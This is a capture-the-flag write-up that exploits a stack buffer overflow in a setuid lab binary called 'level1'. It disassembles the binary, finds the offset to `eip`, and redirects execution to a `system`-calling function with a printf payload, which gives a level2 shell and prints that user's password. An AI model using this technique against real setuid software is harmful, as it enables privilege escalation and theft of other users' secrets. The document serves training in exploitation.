What do we have?

	$ ll
	total 17
	dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 ./
	dr-x--x--x  1 root   root    340 Sep 23  2015 ../
	-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
	-rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
	-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1*
	-rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
	-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile

A `level1` binary. Let's check the assembly:

	$ gdb ./level1
	[...]
	(gdb) b main
	[...]
	(gdb) r
	[...]
	(gdb) disas
	Dump of assembler code for function main:
	0x08048480 <+0>:	push   %ebp
	0x08048481 <+1>:	mov    %esp,%ebp
	=> 0x08048483 <+3>:	and    $0xfffffff0,%esp
	0x08048486 <+6>:	sub    $0x50,%esp
	0x08048489 <+9>:	lea    0x10(%esp),%eax
	0x0804848d <+13>:	mov    %eax,(%esp)
	0x08048490 <+16>:	call   0x8048340 <gets@plt>
	0x08048495 <+21>:	leave  
	0x08048496 <+22>:	ret    
	End of assembler dump.

It simply call `gets` (+16) with a buffer of 80 bytes pre-allocated (+6 to +13). Looking around, `gets` has no memory bounds check, which means it can read input, and thus write in stack, more than what's expected by the developper. This enable a type of vulnerability called `Stack-based Buffer Overflows`; the possibility to rewrite data in the stack, especially registers such as `eip`, whose job is to store the address of the instruction the function should return to. After reading about that (https://academy.hackthebox.com/module/details/31), we started to dig into the program.

Looking at the other functions present, there is a `run` one using `system`!

	(gdb) info functions
	All defined functions:

	Non-debugging symbols:
	[...]
	0x08048444  run
	0x08048480  main
	[...]
	(gdb) disas run
	Dump of assembler code for function run:
	0x08048444 <+0>:	push   %ebp
	0x08048445 <+1>:	mov    %esp,%ebp
	0x08048447 <+3>:	sub    $0x18,%esp
	0x0804844a <+6>:	mov    0x80497c0,%eax
	0x0804844f <+11>:	mov    %eax,%edx
	0x08048451 <+13>:	mov    $0x8048570,%eax
	0x08048456 <+18>:	mov    %edx,0xc(%esp)
	0x0804845a <+22>:	movl   $0x13,0x8(%esp)
	0x08048462 <+30>:	movl   $0x1,0x4(%esp)
	0x0804846a <+38>:	mov    %eax,(%esp)
	0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
	0x08048472 <+46>:	movl   $0x8048584,(%esp)
	0x08048479 <+53>:	call   0x8048360 <system@plt>
	0x0804847e <+58>:	leave  
	0x0804847f <+59>:	ret    
	End of assembler dump.

So let's cause a buffer overflow: First, let's note the memory address we want to go to, the one of `run`.

	0x08048444

Then, use a pattern generator (https://wiremask.eu/tools/buffer-overflow-pattern-generator/) to get a random string to give to `gets`, overflowing the data in the stack.

	gdb ./level1
	(gdb) b main
	[...]
	(gdb) r
	[...]
	(gdb) n
	[...]
	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
	[...]

Give the pattern generator the overwritten address of the wanted register (`eip`: `0x63413563`), so that it'll be able to calculate the offset (how many bytes we need before getting to the ones who will overwrite the register). In our case, the offset is of 76 bytes.

The pattern generator gives us a string with a length of 76 (`Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4A`), to which we'll append to address of `run`. Careful though, the address is in hexa, so we'll escape each byte with `\x` (`\x08\x04\x84\x44`). Also, we are on an Intel x86 CPU, so the multi bytes values are taken from the little endian, meaning, we need to reverse the sequence for the address (`\x08\x04\x84\x44` => `\x44\x84\x04\x08`).

If we use the shell for that:

	$ (printf 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4A'; printf '\x44\x84\x04\x08') | ./level1
	Good... Wait what?
	Segmentation fault (core dumped)

Seems to work, but there is a problem. Assuming it's indeed a shell run by `system`, we removed the `stdin` with the pipe. To avoid this, let's call a `cat` after the printf.

	$ (printf 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4A'; printf '\x44\x84\x04\x08'; cat) | ./level1

	Good... Wait what?

Nice, now we can `cat` the `.pass`.

	cat /home/user/level2/.pass
	53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
